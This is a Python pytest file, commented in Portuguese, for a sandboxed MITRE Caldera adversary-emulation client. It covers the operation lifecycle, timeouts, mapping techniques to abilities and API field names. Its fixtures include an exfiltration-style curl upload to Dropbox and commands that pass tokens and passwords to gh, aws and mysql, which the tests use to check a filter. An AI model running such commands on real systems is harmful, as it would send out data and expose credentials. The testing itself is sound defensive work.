"""Testes do MITRE Caldera client.

Cobertura obrigatória (Semana 10):

- Sandbox bypass → ``SandboxViolationError`` no ``__init__``
- Happy path: create_adversary → run_operation → await_results
- **Timeout** (operação que não finaliza) → ``run_safe`` retorna
  ``status="failed"`` com ``reason="timeout"``
- DEBT comment de ``_map_to_abilities`` presente no source
"""
from __future__ import annotations

import inspect
from unittest.mock import MagicMock

import httpx
import pytest
import respx

from app.config import settings
from app.core.exceptions import SandboxViolationError
from app.infrastructure.intelligence import mitre_caldera_client
from app.infrastructure.intelligence.mitre_caldera_client import CalderaClient


_BASE_URL = "http://caldera:8888"


def _build_client(poll_interval: int = 0) -> CalderaClient:
    return CalderaClient(
        poll_interval=poll_interval,
        http_client=httpx.Client(base_url=_BASE_URL, timeout=5.0, headers={"KEY": "test-key"}),
    )


# -----------------------------------------------------------------------------
# Sandbox invariant
# -----------------------------------------------------------------------------


class TestSandboxInvariant:
    def test_constructor_raises_when_sandbox_disabled(self, monkeypatch):
        monkeypatch.setattr(settings, "CALDERA_SANDBOX_MODE", False)
        with pytest.raises(SandboxViolationError, match="sandbox"):
            CalderaClient(poll_interval=0)

    def test_constructor_ok_when_sandbox_enabled(self):
        # Settings default já é True; só garante que construir não levanta
        client = CalderaClient(poll_interval=0)
        assert client.MAX_WAIT == 600


# -----------------------------------------------------------------------------
# Happy path
# -----------------------------------------------------------------------------


class TestHappyPath:
    @respx.mock
    def test_full_pipeline_returns_metrics(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
        )
        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-1"})
        )
        respx.get(f"{_BASE_URL}/api/v2/operations/op-1").mock(
            return_value=httpx.Response(
                200,
                json={
                    "state": "finished",
                    "chain": [
                        {"status": 0, "ability": {"technique_id": "T1190"}},
                        {"status": 0, "ability": {"technique_id": "T1059"}},
                        {"status": 1, "ability": {"technique_id": "T1078"}},
                    ],
                },
            )
        )

        client = _build_client()
        result = client.run_safe(
            adversary_name="log4shell-poc",
            mitre_techniques=["T1190", "T1059"],
        )

        assert result["status"] == "ok"
        assert result["techniques_executed"] == 3
        assert result["techniques_successful"] == 2
        assert result["success_rate"] == pytest.approx(2 / 3)
        assert result["caldera_validated"] is True
        assert result["ttps_used"] == ["T1190", "T1059", "T1078"]

    @respx.mock
    def test_zero_successful_yields_caldera_validated_false(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
        )
        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-1"})
        )
        respx.get(f"{_BASE_URL}/api/v2/operations/op-1").mock(
            return_value=httpx.Response(
                200,
                json={
                    "state": "finished",
                    "chain": [
                        {"status": 1, "ability": {"technique_id": "T1190"}}
                    ],
                },
            )
        )
        client = _build_client()
        result = client.run_safe("x", ["T1190"])
        assert result["status"] == "ok"
        assert result["caldera_validated"] is False
        assert result["success_rate"] == 0.0

    @respx.mock
    def test_create_adversary_payload(self):
        route = respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-9"})
        )
        client = _build_client()
        adv_id = client.create_adversary("my-adv", ["T1190"])
        assert adv_id == "adv-9"

        sent = route.calls.last.request
        body = sent.content.decode()
        # nome do adversário prefixado com aperia-
        assert "aperia-my-adv" in body
        assert "sandbox" in body  # description

    @respx.mock
    def test_run_operation_uses_settings_agent_group(self, monkeypatch):
        monkeypatch.setattr(settings, "CALDERA_AGENT_GROUP", "blue-team")
        route = respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-7"})
        )
        client = _build_client()
        client.run_operation("adv-abc")
        body = route.calls.last.request.content.decode()
        assert "blue-team" in body


# -----------------------------------------------------------------------------
# Timeout — obrigatório (decisão #1 Semana 10)
# -----------------------------------------------------------------------------


class TestTimeout:
    @respx.mock
    def test_await_results_raises_timeout_when_never_finishes(self):
        respx.get(f"{_BASE_URL}/api/v2/operations/op-stuck").mock(
            return_value=httpx.Response(200, json={"state": "running", "chain": []})
        )
        # poll_interval=1 + MAX_WAIT=600 → 600 iterações. Para teste,
        # forçamos um MAX_WAIT pequeno via monkeypatch.
        client = _build_client(poll_interval=1)
        client.MAX_WAIT = 2  # 2 iterações apenas
        with pytest.raises(TimeoutError, match="op-stuck"):
            client.await_results("op-stuck")

    @respx.mock
    def test_run_safe_timeout_returns_status_failed(self):
        """Cenário obrigatório do checklist Semana 10."""
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
        )
        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-stuck"})
        )
        respx.get(f"{_BASE_URL}/api/v2/operations/op-stuck").mock(
            return_value=httpx.Response(200, json={"state": "running", "chain": []})
        )

        client = _build_client(poll_interval=1)
        client.MAX_WAIT = 2

        result = client.run_safe("op", ["T1190"])
        assert result["status"] == "failed"
        assert result["reason"] == "timeout"
        assert result["caldera_validated"] is False
        assert result["success_rate"] == 0.0
        assert result["ttps_used"] == []


# -----------------------------------------------------------------------------
# Fault isolation — qualquer erro vira status="failed"
# -----------------------------------------------------------------------------


class TestFaultIsolation:
    @respx.mock
    def test_create_adversary_500_yields_failed_status(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(500)
        )
        result = _build_client().run_safe("op", ["T1190"])
        assert result["status"] == "failed"
        assert result["caldera_validated"] is False

    @respx.mock
    def test_run_operation_connection_error_yields_failed(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
        )
        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            side_effect=httpx.ConnectError("Connection refused")
        )
        result = _build_client().run_safe("op", ["T1190"])
        assert result["status"] == "failed"
        assert result["reason"] == "ConnectError"

    @respx.mock
    def test_await_results_500_yields_failed(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-1"})
        )
        respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-x"})
        )
        respx.get(f"{_BASE_URL}/api/v2/operations/op-x").mock(
            return_value=httpx.Response(500)
        )
        result = _build_client().run_safe("op", ["T1190"])
        assert result["status"] == "failed"


# -----------------------------------------------------------------------------
# _map_to_abilities DEBT
# -----------------------------------------------------------------------------


def _resp(payload):
    """Resposta httpx mínima para os testes de mapeamento."""
    r = MagicMock()
    r.json.return_value = payload
    r.raise_for_status.return_value = None
    return r


class TestMapToAbilities:
    """O stub que devolvia `[]` foi implementado.

    Enquanto existiu, o adversário nascia sem nenhuma ability: a operação
    terminava com cadeia vazia e `caldera_validated` era sempre False. Parecia
    "emulação não encontrou nada" quando nada havia sido executado.

    O formato foi validado contra o Caldera 5.0.0 real: a API v2 NÃO filtra por
    técnica (`?technique_id=` responde 422), e o catálogo usa sub-técnicas
    (`T1497.003`).
    """

    def _ability(self, ability_id: str, technique_id: str, plataforma: str = "linux"):
        return {
            "ability_id": ability_id,
            "technique_id": technique_id,
            "executors": [{"platform": plataforma, "command": "id"}],
        }

    def _com_catalogo(self, catalogo):
        client = _build_client()
        client.client.get = MagicMock(return_value=_resp(catalogo))
        return client

    def test_busca_o_catalogo_uma_vez_so(self):
        """`?technique_id=` devolve 422 no Caldera real — filtro é local."""
        client = self._com_catalogo(
            [self._ability("a1", "T1059"), self._ability("a2", "T1082")]
        )

        assert client._map_to_abilities(["T1059", "T1082"]) == ["a1", "a2"]
        assert client.client.get.call_count == 1
        assert client.client.get.call_args[0][0] == "/api/v2/abilities"

    def test_tecnica_pai_casa_com_subtecnicas(self):
        """Pedir `T1497` traz `T1497.003`; o catálogo real usa sub-técnicas."""
        client = self._com_catalogo(
            [self._ability("sub", "T1497.003"), self._ability("outra", "T1082")]
        )

        assert client._map_to_abilities(["T1497"]) == ["sub"]

    def test_subtecnica_exata_nao_traz_irmas(self):
        client = self._com_catalogo(
            [self._ability("a", "T1497.001"), self._ability("b", "T1497.003")]
        )

        assert client._map_to_abilities(["T1497.003"]) == ["b"]

    def test_ignora_ability_sem_executor_linux(self):
        """O agente do sandbox roda Linux: ability de Windows vira link que
        falha e derruba o `success_rate` por motivo alheio ao alvo."""
        client = self._com_catalogo(
            [
                self._ability("win", "T1059", "windows"),
                self._ability("lin", "T1059", "linux"),
            ]
        )

        assert client._map_to_abilities(["T1059"]) == ["lin"]

    def test_tecnica_sem_correspondencia_devolve_vazio(self):
        client = self._com_catalogo([self._ability("a1", "T1059")])

        assert client._map_to_abilities(["T9999"]) == []

    def test_falha_ao_buscar_catalogo_nao_derruba(self):
        client = _build_client()
        client.client.get = MagicMock(side_effect=RuntimeError("boom"))

        assert client._map_to_abilities(["T1059"]) == []

    def test_lista_vazia_nao_faz_requisicao(self):
        client = _build_client()
        client.client.get = MagicMock()

        assert client._map_to_abilities([]) == []
        client.client.get.assert_not_called()


# -----------------------------------------------------------------------------
# Parser de resultados
# -----------------------------------------------------------------------------


class TestParseResults:
    def test_empty_chain_returns_zero_metrics(self):
        client = _build_client()
        result = client._parse_results({"chain": []})
        assert result["techniques_executed"] == 0
        assert result["success_rate"] == 0.0
        assert result["caldera_validated"] is False
        assert result["ttps_used"] == []

    def test_missing_chain_key_handled(self):
        client = _build_client()
        result = client._parse_results({"state": "finished"})
        assert result["techniques_executed"] == 0


class TestContratoRealDaApiV2:
    """Fixa os nomes de campo conferidos contra o Caldera 5.0.0 em execução.

    Os testes antigos mockavam `{"id": ...}` para o adversário e por isso
    **concordavam com o bug**: em produção o POST retornava 200 e o cliente
    estourava `KeyError: 'id'`, que o `run_safe` traduzia para "Caldera
    unavailable" — parecendo falha de conectividade numa chamada que funcionou.

    A assimetria é real e fácil de reintroduzir:
      - adversário → `adversary_id`
      - operação   → `id`
    """

    @respx.mock
    def test_create_adversary_le_adversary_id(self):
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"adversary_id": "adv-real"})
        )
        assert _build_client().create_adversary("x", []) == "adv-real"

    @respx.mock
    def test_create_adversary_falha_alto_se_campo_sumir(self):
        """Se a API mudar, é melhor estourar do que devolver id silenciosamente
        errado — um id inválido faria a operação rodar sem adversário."""
        respx.post(f"{_BASE_URL}/api/v2/adversaries").mock(
            return_value=httpx.Response(200, json={"nome_inesperado": "x"})
        )
        with pytest.raises(KeyError):
            _build_client().create_adversary("x", [])

    @respx.mock
    def test_operacao_referencia_o_adversario_por_adversary_id(self):
        """O payload da operação também usa `adversary_id`; mandar `id` cria
        uma operação sem adversário, que termina com cadeia vazia."""
        rota = respx.post(f"{_BASE_URL}/api/v2/operations").mock(
            return_value=httpx.Response(200, json={"id": "op-real"})
        )

        assert _build_client().run_operation("adv-real") == "op-real"

        import json as _json

        enviado = _json.loads(rota.calls[0].request.content)
        assert enviado["adversary"] == {"adversary_id": "adv-real"}


class TestExecutavelNoSandbox:
    """Ability que exige credencial externa é descartada antes do adversário.

    O sandbox é `internal: true` — sem rota para a internet, por desenho. As
    abilities de exfiltração (Dropbox, GitHub, S3) exigem `dropbox.api.key`,
    `github.access.token` e afins: o planner atômico não satisfaz nenhuma, não
    gera elo e encerra a operação na hora. Foi exatamente o que aconteceu — 6
    abilities mapeadas, 0 executadas — com o relatório dizendo só
    `caldera_validated: false`, sem o motivo.
    """

    def _ability(self, ability_id, technique_id, command):
        return {
            "ability_id": ability_id,
            "name": ability_id,
            "technique_id": technique_id,
            "executors": [{"platform": "linux", "command": command}],
        }

    def _mapear(self, catalogo, tecnicas):
        client = _build_client()
        client.client.get = MagicMock(return_value=_resp(catalogo))
        return client._map_to_abilities(tecnicas)

    def test_descarta_exfiltracao_para_servico_externo(self):
        catalogo = [
            self._ability("exfil", "T1567", "curl -T x https://api.dropbox.com -H '#{dropbox.api.key}'"),
            self._ability("enum", "T1567", "whoami; echo #{host.user.name}"),
        ]
        assert self._mapear(catalogo, ["T1567"]) == ["enum"]

    @pytest.mark.parametrize(
        "command",
        [
            "gh auth login --with-token #{github.access.token}",
            "aws s3 cp x s3://b --profile #{aws.secret}",
            "echo #{servico.api.key}",
            "mysql -p#{db.password}",
        ],
    )
    def test_descarta_qualquer_credencial(self, command):
        catalogo = [self._ability("cred", "T1005", command)]
        assert self._mapear(catalogo, ["T1005"]) == []

    @pytest.mark.parametrize(
        "command",
        [
            "whoami",
            "ls #{host.dir.compress}",
            "curl #{server}/file",
            "find / -user #{host.user.name}",
        ],
    )
    def test_mantem_ability_local(self, command):
        """Facts que o agente ou o próprio Caldera fornecem seguem valendo."""
        catalogo = [self._ability("local", "T1082", command)]
        assert self._mapear(catalogo, ["T1082"]) == ["local"]
